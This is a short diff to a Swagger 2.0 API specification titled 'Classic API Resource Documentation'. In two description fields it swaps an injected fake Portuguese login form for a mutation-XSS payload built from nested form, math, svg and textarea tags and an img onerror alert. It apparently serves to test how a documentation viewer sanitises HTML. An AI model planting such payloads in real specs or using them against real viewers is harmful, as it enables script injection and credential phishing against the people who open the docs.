@@ -2,13 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
- <h2>Login Fake</h2>
-<form action="#">
-    <input type="text" name="usuario" placeholder="Usuário" required><br><br>
-    <input type="password" name="senha" placeholder="Senha" required><br><br>
-    <button type="submit">Entrar</button>
-</form>
-   
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -34,12 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-    <h2>Login Fake</h2>
-<form action="#">
-    <input type="text" name="usuario" placeholder="Usuário" required><br><br>
-    <input type="password" name="senha" placeholder="Senha" required><br><br>
-    <button type="submit">Entrar</button>
-</form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
           format: int64
           in: path
